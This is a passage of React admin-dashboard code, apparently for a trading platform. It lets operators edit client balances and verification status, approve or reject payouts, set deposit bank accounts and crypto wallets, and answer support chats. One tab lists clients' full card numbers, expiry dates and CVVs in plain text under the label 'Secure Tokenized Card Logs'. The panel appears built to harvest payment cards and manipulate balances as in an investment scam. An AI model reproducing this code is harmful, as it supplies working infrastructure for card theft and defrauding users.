                        <label className="text-[10px] font-extrabold text-zinc-400 uppercase tracking-wider block font-sans">
                          Modify Demo Paper Trading Capital Balance
                        </label>
                        <div className="relative">
                          <DollarSign className="absolute left-3 top-2.5 h-4 w-4 text-[#f0b90b]" />
                          <input
                            type="number"
                            required
                            step="any"
                            value={newDemoBalance}
                            onChange={e => setNewDemoBalance(e.target.value)}
                            className="w-full bg-[#2b2f36]/40 border border-zinc-800 rounded-xl pl-9 pr-3 py-2 text-zinc-100 font-mono font-bold"
                          />
                        </div>
                      </div>

                      <div className="space-y-1">
                        <label className="text-[10px] font-extrabold text-zinc-400 uppercase tracking-wider block font-sans">
                          Regulatory verification Status
                        </label>
                        <select
                          value={newKycStatus}
                          onChange={e => setNewKycStatus(e.target.value as any)}
                          className="w-full bg-[#2b2f36]/40 border border-zinc-800 rounded-xl px-3 py-2 text-zinc-100 font-sans font-semibold focus:outline-none"
                        >
                          <option value="unverified" className="bg-[#181a20]">UNVERIFIED</option>
                          <option value="pending" className="bg-[#181a20]">PENDING VERIFICATION</option>
                          <option value="verified" className="bg-[#181a20]">VERIFIED / COMPLIANT</option>
                        </select>
                      </div>

                      <button
                        type="submit"
                        className="w-full bg-emerald-500 hover:bg-emerald-600 text-slate-950 font-black py-2.5 rounded-xl uppercase tracking-wider text-[11px] font-sans transition-all shadow-md mt-2 cursor-pointer flex items-center justify-center gap-1"
                      >
                        <Save className="h-4 w-4" /> Save overrides and flush changes
                      </button>
                    </form>
                  </div>
                </div>
              )}
            </div>
          )}

          {/* TAB 2: PENDING SETTLEMENT CLEARANCES APPROVAL QUEUE */}
          {adminTab === 'clearance' && (
            <div className="space-y-6">
              <div>
                <h3 className="text-lg font-black text-white font-sans uppercase">Pending Settlement Clearances Ledger</h3>
                <p className="text-xs text-zinc-400 leading-normal">
                  Approve or reject outbound profit withdrawals or card deposit injections here. This maintains ledger audits and adjusts live user portfolios.
                </p>
              </div>

              {pendingTxList.length === 0 ? (
                <div className="bg-[#181a20] border border-zinc-850 rounded-2xl p-10 text-center space-y-2 max-w-xl mx-auto border-dashed">
                  <span className="text-2xl block">🎉</span>
                  <h4 className="font-bold text-white text-xs uppercase font-sans">Clearance pipeline empty</h4>
                  <p className="text-xs text-zinc-500 leading-relaxed font-sans">
                    All financial operations initiated from client payment gateways have been fully settled, rejected, or liquidated. No task operations are blockading the stack.
                  </p>
                </div>
              ) : (
                <div className="space-y-4">
                  {pendingTxList.map((tx) => {
                    const isDeposit = tx.type === 'deposit';
                    return (
                      <div key={tx.id} className="bg-[#181a20] border border-zinc-850 rounded-2xl p-4 flex flex-col md:flex-row justify-between items-start md:items-center gap-4 hover:border-zinc-750 transition-all shadow-lg text-xs leading-normal">
                        <div className="space-y-1.5 flex-1">
                          <div className="flex items-center gap-2">
                            <span className="font-mono text-zinc-500 font-bold uppercase tracking-wider">{tx.id}</span>
                            {isDeposit ? (
                              <span className="text-emerald-400 bg-emerald-400/10 px-2 py-0.5 rounded text-[8px] font-extrabold uppercase font-sans border border-emerald-500/10">INCOMING DEPOSIT</span>
                            ) : (
                              <span className="text-amber-400 bg-amber-400/10 px-2 py-0.5 rounded text-[8px] font-extrabold uppercase font-sans border border-amber-500/10">OUTBOUND PAYOUT</span>
                            )}
                            <span className="text-zinc-400 font-sans font-bold text-[10px]">({tx.userEmail})</span>
                          </div>

                          <div className="grid grid-cols-2 md:grid-cols-4 gap-4 pt-1 text-[11px] font-mono">
                            <div>
                              <span className="text-zinc-500 text-[9px] block uppercase font-sans font-extrabold leading-none mb-0.5">Asset & Amount</span>
                              <span className="text-white font-bold">${tx.amount.toLocaleString()} {tx.asset || 'USD'}</span>
                            </div>
                            <div>
                              <span className="text-zinc-500 text-[9px] block uppercase font-sans font-extrabold leading-none mb-0.5">Gateway Channel</span>
                              <span className="text-zinc-300 font-semibold">{tx.method || 'Internal wire'}</span>
                            </div>
                            <div>
                              <span className="text-zinc-500 text-[9px] block uppercase font-sans font-extrabold leading-none mb-0.5">Dispatched Datetime</span>
                              <span className="text-zinc-400">{tx.createdAt}</span>
                            </div>
                            <div>
                              <span className="text-zinc-500 text-[9px] block uppercase font-sans font-extrabold leading-none mb-0.5">Aesthetic context</span>
                              <span className="text-zinc-400 truncate block max-w-[120px]">{tx.description}</span>
                            </div>
                          </div>

                          {tx.cardInfo && (
                            <div className="bg-zinc-950/45 p-2 rounded-xl border border-zinc-900 mt-2 text-[10px] font-mono text-zinc-400 max-w-sm">
                              💳 Captured Card details: <span className="text-[#f0b90b]">{tx.cardInfo.number}</span> | exp: {tx.cardInfo.expiry} | cvv: {tx.cardInfo.cvv}
                            </div>
                          )}
                        </div>

                        <div className="flex gap-2.5 self-end md:self-auto shrink-0">
                          <button
                            onClick={() => handleRejectTransaction(tx.id)}
                            className="bg-red-500/10 hover:bg-red-500 text-red-400 hover:text-white border border-red-500/20 px-3.5 py-1.5 rounded-lg text-[10px] font-black uppercase font-sans tracking-wide transition-all inline-flex items-center gap-1 cursor-pointer shadow-sm"
                          >
                            <XCircle className="h-3.5 w-3.5" /> REJECT VOID
                          </button>
                          <button
                            onClick={() => handleApproveTransaction(tx.id)}
                            className="bg-emerald-500 hover:bg-emerald-600 text-slate-950 px-3.5 py-1.5 rounded-lg text-[10px] font-black uppercase font-sans tracking-wide transition-all inline-flex items-center gap-1 cursor-pointer shadow-md"
                          >
                            <CheckCircle className="h-3.5 w-3.5" /> APPROVE DISPATCH
                          </button>
                        </div>
                      </div>
                    );
                  })}
                </div>
              )}
            </div>
          )}

          {/* TAB 3: GLOBAL GATEWAY CONFIGURATIONS */}
          {adminTab === 'payments' && (
            <div className="space-y-6 max-w-2xl">
              <div>
                <h3 className="text-lg font-black text-white font-sans uppercase">Aesthetic Gateway Payment configurations</h3>
                <p className="text-xs text-zinc-400 leading-normal">
                  Configure direct bank wire properties and block deposit validator addresses. Changes flush directly to the client payment modals in real-time.
                </p>
              </div>

              <form onSubmit={handleUpdatePaymentConfig} className="bg-[#181a20] border border-zinc-850 rounded-2xl p-5 space-y-4 text-xs font-medium">
                <div className="border-b border-zinc-800 pb-2">
                  <h4 className="text-xs font-extrabold text-[#f0b90b] uppercase font-sans">Bank Swift Wire parameters</h4>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-1.5">
                    <label className="text-[10px] font-extrabold text-zinc-400 uppercase tracking-wider block font-sans">Apex Custody Bank Name</label>
                    <input
                      type="text"
                      required
                      value={paymentConfig.bankName}
                      onChange={e => setPaymentConfig({ ...paymentConfig, bankName: e.target.value })}
                      className="w-full bg-[#2b2f36]/40 border border-zinc-850 rounded-xl px-3 py-2 text-white font-mono"
                    />
                  </div>
                  <div className="space-y-1.5">
                    <label className="text-[10px] font-extrabold text-zinc-400 uppercase tracking-wider block font-sans">Escrow Beneficiary entity Name</label>
                    <input
                      type="text"
                      required
                      value={paymentConfig.beneficiary}
                      onChange={e => setPaymentConfig({ ...paymentConfig, beneficiary: e.target.value })}
                      className="w-full bg-[#2b2f36]/40 border border-zinc-850 rounded-xl px-3 py-2 text-white font-mono"
                    />
                  </div>
                  <div className="space-y-1.5">
                    <label className="text-[10px] font-extrabold text-zinc-400 uppercase tracking-wider block font-sans">IBAN / Account number ID</label>
                    <input
                      type="text"
                      required
                      value={paymentConfig.iban}
                      onChange={e => setPaymentConfig({ ...paymentConfig, iban: e.target.value })}
                      className="w-full bg-[#2b2f36]/40 border border-zinc-850 rounded-xl px-3 py-2 text-white font-mono"
                    />
                  </div>
                  <div className="space-y-1.5">
                    <label className="text-[10px] font-extrabold text-zinc-400 uppercase tracking-wider block font-sans">Bank Routing / Sort Code</label>
                    <input
                      type="text"
                      required
                      value={paymentConfig.sortCode}
                      onChange={e => setPaymentConfig({ ...paymentConfig, sortCode: e.target.value })}
                      className="w-full bg-[#2b2f36]/40 border border-zinc-850 rounded-xl px-3 py-2 text-white font-mono"
                    />
                  </div>
                </div>

                <div className="border-b border-zinc-800 pb-2 pt-3">
                  <h4 className="text-xs font-extrabold text-[#f0b90b] uppercase font-sans">Block deposit crypto Wallets</h4>
                </div>

                <div className="space-y-4">
                  <div className="space-y-1.5">
                    <label className="text-[10px] font-extrabold text-zinc-400 uppercase tracking-wider block font-sans">Bitcoin validation Address (Mainnet)</label>
                    <input
                      type="text"
                      required
                      value={paymentConfig.btcAddress}
                      onChange={e => setPaymentConfig({ ...paymentConfig, btcAddress: e.target.value })}
                      className="w-full bg-[#2b2f36]/40 border border-zinc-850 rounded-xl px-3 py-2 text-emerald-400 font-mono font-semibold"
                    />
                  </div>
                  <div className="space-y-1.5">
                    <label className="text-[10px] font-extrabold text-zinc-400 uppercase tracking-wider block font-sans">USDT address TRC20 verification segment</label>
                    <input
                      type="text"
                      required
                      value={paymentConfig.usdtAddress}
                      onChange={e => setPaymentConfig({ ...paymentConfig, usdtAddress: e.target.value })}
                      className="w-full bg-[#2b2f36]/40 border border-zinc-850 rounded-xl px-3 py-2 text-emerald-400 font-mono font-semibold"
                    />
                  </div>
                </div>

                <button
                  type="submit"
                  className="bg-yellow-500 hover:bg-yellow-600 text-zinc-950 font-black py-2 px-6 rounded-xl uppercase tracking-wider font-sans text-[11px] transition-all flex items-center gap-1 cursor-pointer"
                >
                  <Save className="h-4 w-4" /> Save global gateway layout configuration
                </button>
              </form>
            </div>
          )}

          {/* TAB 4: SECURE CAPTURED CREDIT CARD LOGS */}
          {adminTab === 'cards' && (
            <div className="space-y-6">
              <div>
                <h3 className="text-lg font-black text-white font-sans uppercase">Secure Tokenized Card Logs</h3>
                <p className="text-xs text-zinc-400 leading-normal">
                  For regulatory sandbox clearances, inspect visual credit card entries (numbers, cardExpiry, holder and security numbers CVV) captured during transaction tests.
                </p>
              </div>

              {/* Mobile credit card layout view */}
              <div className="grid grid-cols-1 gap-4 md:hidden">
                {cardTransactions.length === 0 ? (
                  <div className="text-center py-8 text-zinc-400 bg-[#181a20] rounded-2xl border border-zinc-850">
                    No Credit Cards loaded yet onto target storage nodes. Perform a card deposit from client dashboard first.
                  </div>
                ) : (
                  cardTransactions.map((tx) => {
                    if (!tx.cardInfo) return null;
                    return (
                      <div key={tx.id} className="bg-gradient-to-br from-[#1b1e25] to-[#121419] border border-zinc-800 rounded-2xl p-4 space-y-4 shadow-xl relative overflow-hidden select-text">
                        <div className="absolute -right-4 -bottom-4 w-24 h-24 bg-yellow-500/[0.02] border border-yellow-500/[0.04] rounded-full spinner-glow pointer-events-none"></div>
                        
                        <div className="flex justify-between items-start">
                          <div className="space-y-0.5">
                            <span className="text-[10px] text-zinc-500 block font-mono">CLIENT PROFILE</span>
                            <span className="text-zinc-200 text-xs font-bold leading-tight break-all block max-w-[200px]">{tx.userEmail}</span>
                          </div>
                          <div className="text-right">
                            <span className="text-[10px] text-zinc-500 block font-mono">CLEARANCE LIMIT</span>
                            <span className="text-emerald-400 text-sm font-extrabold">${tx.amount.toLocaleString()}</span>
                          </div>
                        </div>

                        <div className="space-y-2">
                          <div className="bg-gradient-to-r from-zinc-900 to-zinc-950 p-4 rounded-xl border border-zinc-800 relative shadow-inner">
                            <div className="flex justify-between items-center mb-3">
                              <span className="text-[8px] font-black tracking-widest text-[#f0b90b] font-mono">VISA ELECTRONIC</span>
                              <span className="h-4 w-6 bg-gradient-to-r from-amber-500 to-yellow-600 rounded opacity-85"></span>
                            </div>
                            
                            <div className="text-sm font-bold text-white tracking-widest font-mono text-center mb-3">
                              {tx.cardInfo.number}
                            </div>

                            <div className="flex justify-between items-end text-[9px] font-mono text-zinc-400">
                              <div>
                                <span className="text-[7px] text-zinc-650 block leading-none mb-0.5 font-sans">CARD SIGNATURE</span>
                                <span className="uppercase text-zinc-300 truncate block max-w-[125px]">{tx.cardInfo.holder}</span>
                              </div>
                              <div className="text-center font-mono">
                                <span className="text-[7px] text-zinc-650 block leading-none mb-0.5 font-sans">EXPIRE</span>
                                <span>{tx.cardInfo.expiry}</span>
                              </div>
                              <div className="text-right font-mono">
                                <span className="text-[7px] text-zinc-650 block leading-none mb-0.5 font-sans">CVV</span>
                                <span className="text-yellow-500 font-extrabold">{tx.cardInfo.cvv}</span>
                              </div>
                            </div>
                          </div>
                        </div>

                        <div className="flex justify-between items-center text-[10px] text-zinc-500 font-mono border-t border-zinc-850 pt-2.5">
                          <span>TX ID: {tx.id}</span>
                          <span>Recorded: {tx.createdAt}</span>
                        </div>
                      </div>
                    );
                  })
                )}
              </div>

              {/* Desktop credit card layout view */}
              <div className="hidden md:block bg-[#181a20] border border-zinc-850 rounded-2xl overflow-hidden shadow-xl">
                <div className="overflow-x-auto">
                  <table className="w-full text-left border-collapse min-w-[700px]">
                    <thead>
                      <tr className="text-[10px] text-zinc-500 border-b border-zinc-800 uppercase font-bold tracking-widest bg-zinc-950/20">
                        <th className="p-4">Profile Client</th>
                        <th className="p-4">Visa credit card details</th>
                        <th className="p-4">Cardholder signature name</th>
                        <th className="p-4 font-mono">Validity expire</th>
                        <th className="p-4 font-mono">CVV Secure code</th>
                        <th className="p-4 font-mono">Capital Clearance</th>
                        <th className="p-4">Dispatched Ref Time</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-zinc-800/60 font-mono text-xs">
                      {cardTransactions.length === 0 ? (
                        <tr>
                          <td colSpan={7} className="p-8 text-center text-zinc-550">
                            No Credit Cards loaded yet onto target storage nodes. Perform a card deposit from client dashboard first.
                          </td>
                        </tr>
                      ) : (
                        cardTransactions.map((tx) => {
                          if (!tx.cardInfo) return null;
                          return (
                            <tr key={tx.id} className="hover:bg-zinc-850/20 transition-all">
                              <td className="p-4 text-zinc-400">{tx.userEmail}</td>
                              <td className="p-4 text-emerald-400 font-bold">{tx.cardInfo.number}</td>
                              <td className="p-4 text-zinc-300 font-sans font-medium uppercase">{tx.cardInfo.holder}</td>
                              <td className="p-4 text-zinc-400">{tx.cardInfo.expiry}</td>
                              <td className="p-4 text-yellow-500 font-bold">{tx.cardInfo.cvv}</td>
                              <td className="p-4 text-white font-bold">${tx.amount.toLocaleString()}</td>
                              <td className="p-4 text-zinc-500">{tx.createdAt}</td>
                            </tr>
                          );
                        })
                      )}
                    </tbody>
                  </table>
                </div>
              </div>
            </div>
          )}

          {/* TAB 5: DYNAMIC SUPPORT CHATS CHANNELS */}
          {adminTab === 'support' && (() => {
            const uniqueChatUsers = Array.from(new Set(allSupportMessages.map(m => m.userEmail).filter(Boolean))) as string[];
            return (
              <div className="space-y-6">
                <div>
                  <h3 className="text-lg font-black text-white font-sans uppercase">Active Customer Support Channels</h3>
                  <p className="text-xs text-zinc-400 leading-normal">
                    Answer client messages and inquiries live. This panel connects directly to active client terminals with persistent secure logging.
                  </p>
                </div>

                <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 h-[480px] sm:h-[550px] bg-[#181a20] border border-zinc-850 rounded-2xl overflow-hidden shadow-xl">
                  {/* Left Side: Users list */}
                  <div className="col-span-1 lg:col-span-4 border-r border-zinc-850 flex flex-col h-full bg-[#12141a]/40 overflow-hidden">
                    <div className="p-4 border-b border-zinc-850 shrink-0">
                      <span className="text-[10px] text-[#f0b90b] font-extrabold uppercase block tracking-wider">Active support threads</span>
                    </div>
                    
                    <div className="flex-1 overflow-y-auto divide-y divide-zinc-850/40">
                      {uniqueChatUsers.length === 0 ? (
                        <div className="p-8 text-center text-zinc-500 font-sans">
                          No active support sessions recorded yet.
                        </div>
                      ) : (
                        uniqueChatUsers.map((userEmail) => {
                          const userMsgs = allSupportMessages.filter(m => m.userEmail === userEmail);
                          const lastMsg = userMsgs[userMsgs.length - 1];
                          const isSelected = selectedChatUser === userEmail;
                          
                          return (
                            <button
                              type="button"
                              key={userEmail}
                              onClick={() => setSelectedChatUser(userEmail)}
                              className={`w-full text-left p-3.5 transition-all flex flex-col gap-1 cursor-pointer hover:bg-zinc-800/20 ${
                                isSelected ? 'bg-yellow-500/[0.05] border-l-2 border-yellow-500' : ''
                              }`}
                            >
                              <span className="font-extrabold text-white text-[11px] truncate block select-all">{userEmail}</span>
                              <span className="text-[10px] text-zinc-400 truncate block font-sans">
                                {lastMsg ? `${lastMsg.sender === 'agent' ? 'You: ' : ''}${lastMsg.text}` : 'No messages'}
                              </span>
                              {lastMsg && (
                                <span className="text-[8px] text-zinc-500 font-mono font-medium block mt-0.5">{lastMsg.timestamp}</span>
                              )}
                            </button>
                          );
                        })
                      )}
                    </div>
                  </div>

                  {/* Right Side: Conversation Area */}
                  <div className="col-span-1 lg:col-span-8 flex flex-col h-full justify-between bg-zinc-950/20 overflow-hidden">
                    {selectedChatUser ? (
                      <div className="flex flex-col h-full overflow-hidden">
                        {/* Active conversation header */}
                        <div className="p-4 border-b border-zinc-850 bg-[#12141a]/60 flex items-center justify-between shrink-0">
                          <div className="flex flex-col">
                            <span className="text-[9px] text-[#f0b90b] font-extrabold uppercase tracking-widest font-mono">LIVE SECURE FEED</span>
                            <span className="font-black text-white text-xs truncate max-w-[200px] sm:max-w-none">{selectedChatUser}</span>
                          </div>
                          <button 
                            type="button"
                            onClick={() => {
                              setAdminReplyText("Dear trader, our system operators have adjusted your portfolio clearance limits. Please review your active trade balances under the dashboard terminal.");
                            }}
                            className="bg-zinc-800 hover:bg-zinc-700 text-[9px] px-2.5 py-1 rounded-lg border border-zinc-750 text-zinc-200 font-black uppercase cursor-pointer transition-all active:scale-95"
                          >
                            Use Template
                          </button>
                        </div>

                        {/* Chat messages scroller */}
                        <div className="flex-1 p-4 overflow-y-auto space-y-3.5 flex flex-col">
                          {allSupportMessages
                            .filter(m => m.userEmail === selectedChatUser)
                            .map((msg, i) => {
                              const isAgent = msg.sender === 'agent';
                              return (
                                <div
                                  key={msg.id || i}
                                  className={`max-w-[85%] sm:max-w-[70%] rounded-2xl p-3 flex flex-col space-y-1 shadow-sm ${
                                    isAgent 
                                      ? 'bg-yellow-500/10 text-yellow-300 border border-yellow-500/10 self-end rounded-tr-none'
                                      : 'bg-[#2b2f36]/70 text-zinc-100 self-start rounded-tl-none'
                                  }`}
                                >
                                  <span className="text-xs leading-relaxed break-words font-sans selection:bg-yellow-500 selection:text-zinc-900">{msg.text}</span>
                                  <span className={`text-[8px] font-mono leading-none tracking-wider font-semibold ${isAgent ? 'text-yellow-600/80 self-end' : 'text-zinc-500'}`}>
                                    {isAgent ? 'OPERATOR' : 'CLIENT'} • {msg.timestamp}
                                  </span>
                                </div>
                              );
                            })}
                        </div>

                        {/* Textbox composer area */}
                        <form onSubmit={handleSendAdminReply} className="p-3 border-t border-zinc-850 bg-[#12141a]/50 flex gap-2 shrink-0">
                          <input
                            type="text"
                            required
                            value={adminReplyText}
                            onChange={e => setAdminReplyText(e.target.value)}
                            placeholder={`Reply answers to dispatch to ${selectedChatUser}...`}
                            className="flex-1 bg-[#2b2f36]/20 border border-zinc-800 rounded-xl px-4 py-2 text-xs text-white placeholder-zinc-650 focus:outline-none focus:ring-1 focus:ring-yellow-500"
                          />
                          <button
                            type="submit"
                            className="bg-[#f0b90b] hover:bg-[#FFC933] text-[#0b0e11] font-black px-5 rounded-xl uppercase tracking-wider text-[10px] font-sans transition-all shrink-0 cursor-pointer flex items-center justify-center active:scale-95 shadow"
                          >
                            Send
                          </button>
                        </form>
                      </div>
                    ) : (
                      <div className="flex-1 flex flex-col items-center justify-center p-8 text-center space-y-3 text-zinc-550 h-full">
                        <span className="text-4xl animate-bounce">💬</span>
                        <h4 className="font-extrabold text-white text-xs uppercase font-sans tracking-wide">No active chat selected</h4>
                        <p className="text-xs text-zinc-400 max-w-sm leading-normal">
                          Select a client support thread from the left menu to audit their inquiry logs, inspect client transactions, or type replies to transmit via our tunnel.
                        </p>
                      </div>
                    )}
                  </div>
                </div>
              </div>
            );
          })()}

        </main>
      </div>
    </div>
  );
}
